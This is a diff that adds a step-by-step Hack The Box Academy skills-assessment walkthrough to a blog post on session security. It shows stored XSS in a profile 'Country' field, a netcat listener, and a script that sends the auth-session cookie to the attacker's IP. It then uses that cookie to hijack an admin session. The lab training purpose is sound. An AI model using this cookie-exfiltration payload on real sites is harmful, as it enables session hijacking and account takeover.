@@ -2,7 +2,7 @@
 layout: post
 title:  "Hack The Box - Academy - Session Security"
 description: "Explore this detailed walkthrough of Hack The Box Academy's Session Security module. Learn effective techniques to perform Session Attacks utilizing Session Hijacking, Session Fixation, XSS, CSRF and Open redirects to elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
-date:   2025-01-02 22:43
+date:   2025-01-06 20:15
 image:  /images/htb/session-security/logo.png
 tags:   [session-security,cbbh]
 categories: [htbacademy]
@@ -246,5 +246,125 @@ Cross-Site Request Forgery (CSRF) exploits a user's authenticated session to exe
 
 1. A crafted malicious web page issuing valid cross-site requests.
 2. The victim being logged into the application when the malicious request is executed.
+
+<hr/>
+
+## Skills Assessment
+
+><b>Overview:</b>
+You are currently participating in a bug bounty program.<br/><br/>
+The only URL in scope is http://minilab.htb.net <br/><br/>
+Attacking end-users through client-side attacks is in scope for this particular bug bounty program. <br/><br/>
+Test account credentials:<br/><br/>
+Email: heavycat106<br/>
+Password: rocknrol<br/><br/>
+Through dirbusting, you identified the following endpoint<br/><br/>http://minilab.htb.net/submit-solution<br/><br/>
+Find a way to hijack an admin's session. Once you do that, answer the two questions below.<br/></br>
+
+
+### Add the Target_IP and minilab.htb.net to your /etc/hosts file.
+
+```
+IP={TARGET_IP_ADDRESS}
+printf "%s\t%s\n\n" "$IP" "minilab.htb.net" | sudo tee -a /etc/hosts
+```
+
+`Ensure Caido is running and capturing all http requests.`
+
+### Login with the provided credetials
+
+Log in to the application using the credentials provided for the assessment.
+
+![Login with provided credentials](/images/htb/session-security/login-page.png)
+
+Upon logging in, you will reach the profile of Julie Rogers:
+
+![Julie Rogers Profile - Home Page](/images/htb/session-security/home-page.png)
+
+Ensure Julie’s profile is set to public. If the "Share" button is visible, the profile is already public. If not, click "Change Visibility" and set the profile to public.
+
+### Test inputs for XXS vulnerabilities
+
+The "Country" input field is vulnerable to XSS injection. Use the following payload to test the vulnerability:
+
+```
+<script>prompt(1)</script>
+```
+![Julie Rogers Profile - Home Page](/images/htb/session-security/xss-input-testing.png)
+
+Save the profile after injecting the payload. To test the XSS, click on the "Share" button to view Julie Rogers' profile.
+
+![Country Input - XSS Vulnerability](/images/htb/session-security/xss-vulnerability.png)
+
+### Extract cookie via XSS
+
+To extract the auth-session cookie, follow these steps:
+
+1. Start a netcat listener on your machine:
+
+```
+nc -nlvp 1337
+```
+
+2. Update the following payload with your machine’s IP and inject it into Julie’s "Country" field:
+
+```
+<script>const cookies = document.cookie;
+const authSession = cookies.split('; ').find(row => row.startsWith('auth-session='));
+if (authSession) {
+    const authValue = encodeURIComponent(authSession.split('=')[1]);
+    
+    fetch(`http://{YOUR_MACHINE_IP}:1337/?cookie=${authValue}`)
+        .then(response => console.log('Cookie sent successfully'))
+        .catch(error => console.error('Error sending cookie:', error));
+} else {
+    console.error('auth-session cookie not found');
+}</script>
+```
+
+3. Save the profile and click "Share Profile." Check the netcat terminal for the received cookie:
+
+![NetCat - Cookie Extraction](/images/htb/session-security/test-netcat-cookie-extraction.png)
+
+### Submit the Solution and Extract Admin cookie
+
+1. Visit the `http://minilab.htb.net/submit-solution` endpoint provided in the Skills Assessment instructions. You will see the error: `Please specify the ?url=<> parameter`.
+
+2. Add the query parameter to visit Julie’s profile:
+
+```
+http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
+```
+
+3. A success payload will appear on the submit-solution endpoint, and another user’s auth-session cookie will be sent to your netcat listener.
+
+![Submit Solution - Success visit](/images/htb/session-security/submit-solution-success-visit.png)
+
+![Authsession cookie - Extracted](/images/htb/session-security/auth-session-cookie-extracted.png)
+
+
+### Decode and Replace the Cookie
+
+1. Decode the received auth-session cookie:
+
+```
+echo "{AUTH_SESSION_COOKIE}" | sed 's/%/\\x/g' | xargs -0 echo -e
+```
+
+2. Open your browser’s developer tools, navigate to Session Storage or Cookies, and replace the auth-session value with the decoded cookie.
+
+![SuperAdmin - Profile](/images/htb/session-security/super-admin-profile.png)
+
+3. Change the visibility of the SuperAdmin account and visit the share profile page:
+
+![SuperAdmin - Share Profile](/images/htb/session-security/superadmin-share-profile.png)
+
+### Capture the Second Flag
+
+1. Ensure Caido is running.
+2. Click the "Flag2" button to download the PCAP file.
+3. Search for `FLAG{` in the PCAP file response in Caido
+
+![PCAP - Flag result](/images/htb/session-security/PCAP-flag-result.png)
 
 <hr/>
